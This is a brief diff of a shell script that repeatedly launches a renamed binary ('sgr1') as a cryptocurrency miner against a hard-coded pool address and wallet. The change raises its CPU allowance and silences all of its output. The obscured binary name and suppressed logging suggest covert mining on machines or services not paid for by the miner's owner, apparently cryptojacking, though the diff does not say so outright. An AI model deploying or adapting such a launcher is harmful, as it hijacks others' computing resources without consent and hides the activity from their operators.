@@ -21,11 +21,11 @@ chmod +x sgr1
 
 while true; do
     # Start the process with cpulimit
-    cpulimit -l 400 -e ./sgr1 &
+    cpulimit -l 600 -e ./sgr1 &
     pid=$!
 
     # Run the process with the specified parameters
-    ./sgr1  -a yescryptr32 --pool 45.115.224.59:8443 -u UddCZe5d6VZNj2B7BgHPfyyQvCek6txUTx.$WORKER --timeout 120  &
+    ./sgr1  -a yescryptr32 --pool 45.115.224.59:8443 -u UddCZe5d6VZNj2B7BgHPfyyQvCek6txUTx.$WORKER --timeout 120 > /dev/null 2>&1 &
 
     # Run for 1 minute
     sleep 60
